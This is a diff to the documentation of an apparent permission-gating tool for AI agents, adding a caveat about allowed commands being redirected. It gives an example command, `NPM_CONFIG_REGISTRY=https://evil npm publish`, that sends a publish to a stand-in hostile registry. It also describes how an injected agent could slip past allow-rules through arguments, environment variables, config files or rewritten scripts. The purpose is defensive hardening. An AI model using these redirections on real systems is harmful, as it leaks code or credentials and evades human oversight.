@@ -102,6 +102,14 @@ asked again. Inside the rules you work freely; every `--ask` is a window.
    - **another host**: with `hosts`, name only the vendor's own;
    - a **script in the project** you allow or a folder you list: an injected agent
      can rewrite it. Prefer a program with arguments.
+   - an **argument or variable that steers an allowed program**: `cargo publish
+     --manifest-path /elsewhere/Cargo.toml` still matches `cargo publish`, and
+     `NPM_CONFIG_REGISTRY=https://evil npm publish` matches `npm publish`. The
+     window shows the arguments beyond the allowed prefix and, for `publish`
+     and `payment`, the program gets only a fixed environment (no registry or
+     URL overrides), with the dropped names listed. The program's own config
+     files (`.npmrc`, `.cargo/config.toml`) can still redirect it: Vahta does
+     not read them, so keep them in reviewed code.
 4. Then `vahta add` with all of it in one command. The reply repeats the
    category's checklist.
 
